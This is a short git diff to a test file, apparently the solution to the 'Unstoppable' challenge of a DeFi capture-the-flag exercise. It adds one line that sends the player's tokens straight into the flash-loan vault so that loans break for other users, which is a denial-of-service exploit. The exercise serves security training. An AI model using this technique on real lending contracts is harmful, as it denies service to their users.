@@ -44,7 +44,10 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+      // The flash loan itself and the balances are not depleateable,
+      // instead we jus need to break it for anyone else trying to get loans.
+      await token.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
